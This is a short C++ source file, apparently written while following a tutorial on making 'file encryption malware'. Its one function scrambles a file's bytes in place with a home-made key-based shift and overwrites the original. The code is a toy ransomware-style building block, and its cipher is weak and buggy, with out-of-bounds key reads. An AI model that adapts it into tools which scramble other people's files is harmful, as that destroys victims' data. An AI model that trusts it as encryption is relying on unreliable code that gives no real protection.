/*
This function is based on this video: https://youtu.be/DOIcAVIUbdk

Channel name: Glotravi
Video Title: How To Create A Simple File Encryption Malware Using C/C++
*/

#include <iostream>
#include <fstream>
#include <include/colors.hpp>
#include <vector>
using namespace std;

void encrypt(string inFile, string key) {
    //file is the file that is to be encrypted
    //tempFile is a temporary file that will hold the encrypted data that will be written to the origional file
    fstream file, tempFile;
    string tempFilePath = "temp.txt";

    //Open the file streams
    //Open inFile to read and open the tempFile to write
    file.open(inFile, ios::in | ios::binary);
    tempFile.open(tempFilePath, ios::out | ios::binary);
    cout << BOLDRED << "inFile and working filee have been opened!" << RESET << endl;


    /*ENCRYPTING, STAGE 1*/
    //Read the file byte by byte
    cout << RED << "Writing encrypted data to the working file..." << RESET << endl;
    char byte;
    int index = 0;
    while(file >> noskipws >> byte) {
        if(size(key) < index) {
            index -= size(key);
        }
        if(int(key[index]) > int(key[index + 1])) {
            for(int i = 0; i < size(key); i++) {
                byte += int(key[index]);
            }
        } else {
            for(int i = 0; i < size(key); i++) {
                byte -= int(key[index]);
            }
        }

        tempFile << byte;

        index += 1;
    }
    

    //Close the file streams
    file.close();
    tempFile.close();
    cout << BOLDYELLOW << "inFile and working file have been closed!" << RESET << endl;

    //Re-open the file streams, but instead we write the encrypted contents of tempFile to the origional file
    file.open(inFile, ios::out | ios::binary);
    tempFile.open(tempFilePath, ios::in | ios::binary);
    cout << YELLOW << "Writing encrypted data back to the inFile..." << RESET << endl;

    //Read tempFile byte by byte
    while(tempFile >> noskipws >> byte) {
        //Save the byte into inFile
        file << byte;
    }

    //Close the file streams
    file.close();
    tempFile.close();

    //Delete the temp file
    remove(tempFilePath.c_str());

    
    cout << GREEN << "Done!" << RESET << endl;
}
